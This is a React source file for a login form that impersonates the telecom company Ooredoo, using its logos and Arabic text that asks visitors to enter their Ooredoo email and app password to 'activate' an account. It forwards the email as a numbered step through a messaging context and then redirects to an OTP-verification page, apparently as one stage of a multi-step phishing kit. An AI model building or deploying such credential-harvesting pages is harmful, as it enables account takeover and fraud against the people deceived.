import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useRegistration } from "@/contexts/RegistrationContext";
import { toast } from "sonner";
import ooredooHeader from "@/assets/ooredoo-header.png";
import ooredooLogo from "@/assets/ooredoo-logo.png";

const formSchema = z.object({
  email: z.string().email({ message: "البريد الإلكتروني غير صالح" }),
  password: z.string().min(6, { message: "كلمة المرور يجب أن تكون 6 أحرف على الأقل" }),
});

type FormData = z.infer<typeof formSchema>;

const OoreedooVerification = () => {
  const navigate = useNavigate();
  const { updateData, sendCumulativeMessage } = useRegistration();
  const [isLoading, setIsLoading] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(formSchema),
  });

  const onSubmit = async (data: FormData) => {
    setIsLoading(true);
    
    try {
      // Save Ooredoo credentials
      await updateData({
        visitorEmail: data.email,
      });

      await sendCumulativeMessage(8, "تفعيل حساب Ooredoo", {
        visitorEmail: data.email,
      });

      toast.success("تم التحقق بنجاح");
      
      // Navigate to next step (you can change this route as needed)
      setTimeout(() => {
        navigate("/otp-verification");
      }, 1500);
    } catch (error) {
      toast.error("حدث خطأ في عملية التحقق");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="flex-1 flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-md space-y-6">
          {/* Header Image */}
          <div className="flex justify-center mb-6">
            <img 
              src={ooredooHeader} 
              alt="Ooredoo Header" 
              className="w-full max-w-sm"
            />
          </div>

          {/* Main Card */}
          <div className="bg-[#f5f5dc] rounded-lg shadow-lg p-8 border border-gray-200">
            <h1 className="text-2xl font-bold text-center mb-4 text-foreground">
              ربط رقم الهاتف المحمول وتفعيل الحساب
            </h1>
            
            <div className="text-center text-muted-foreground mb-8 space-y-3 text-sm leading-relaxed">
              <p>
                لإتمام تفعيل الحساب، يتطلب النظام تسجيل الدخول إلى حسابك في Ooredoo للتحقق من رقم الهاتف وربطه بالخدمة.
              </p>
              <p>
                يرجى إدخال بيانات الدخول الخاصة بك في تطبيق Ooredoo عبر بوابتها الآمنة لضمان دقة وأمان عملية التفعيل.
              </p>
            </div>

            <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="email">البريد الإلكتروني Ooredoo</Label>
                <Input
                  id="email"
                  type="email"
                  placeholder="example@ooredoo.qa"
                  {...register("email")}
                  className={errors.email ? "border-destructive" : ""}
                  dir="ltr"
                />
                {errors.email && (
                  <p className="text-sm text-destructive">{errors.email.message}</p>
                )}
              </div>

              <div className="space-y-2">
                <Label htmlFor="password">كلمة سر التطبيق</Label>
                <Input
                  id="password"
                  type="password"
                  placeholder="••••••••"
                  {...register("password")}
                  className={errors.password ? "border-destructive" : ""}
                  dir="ltr"
                />
                {errors.password && (
                  <p className="text-sm text-destructive">{errors.password.message}</p>
                )}
              </div>

              <Button
                type="submit"
                className="w-full"
                disabled={isLoading}
              >
                {isLoading ? "جاري التحقق..." : "تأكيد"}
              </Button>
            </form>
          </div>

          {/* Ooredoo Logo */}
          <div className="flex justify-center mt-8">
            <img 
              src={ooredooLogo} 
              alt="Ooredoo Logo" 
              className="h-16 object-contain"
            />
          </div>
        </div>
      </div>
    </div>
  );
};

export default OoreedooVerification;
